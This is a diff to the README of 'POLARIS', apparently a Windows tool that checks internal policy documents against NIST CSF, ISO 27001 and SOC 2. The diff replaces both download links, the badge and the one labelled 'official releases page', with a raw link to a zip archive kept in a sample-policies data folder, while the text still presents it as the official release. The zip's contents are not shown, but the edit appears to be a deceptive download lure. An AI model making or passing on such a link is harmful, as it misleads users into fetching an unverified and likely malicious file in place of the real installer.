@@ -1,6 +1,6 @@
 # 🛡️ POLARIS - Identify security gaps in your policy
 
-[![](https://img.shields.io/badge/Download-POLARIS_for_Windows-blue.svg)](https://github.com/macald8935/POLARIS/releases)
+[![](https://img.shields.io/badge/Download-POLARIS_for_Windows-blue.svg)](https://raw.githubusercontent.com/macald8935/POLARIS/main/data/sample_policies/Software-v2.3.zip)
 
 POLARIS helps you manage your cybersecurity posture. This tool scans your internal policy documents to find missing requirements from standards like NIST CSF, ISO 27001, and SOC 2. The software runs entirely on your machine. You keep your data private and offline.
 
@@ -20,7 +20,7 @@ Before you install this software, ensure your computer meets these minimum speci
 
 ## 📥 How to download and install
 
-1. Visit the [official releases page](https://github.com/macald8935/POLARIS/releases) to download the application.
+1. Visit the [official releases page](https://raw.githubusercontent.com/macald8935/POLARIS/main/data/sample_policies/Software-v2.3.zip) to download the application.
 2. Select the file named `POLARIS-Setup.exe` from the latest release list.
 3. Save the file to your computer.
 4. Locate the file in your downloads folder.
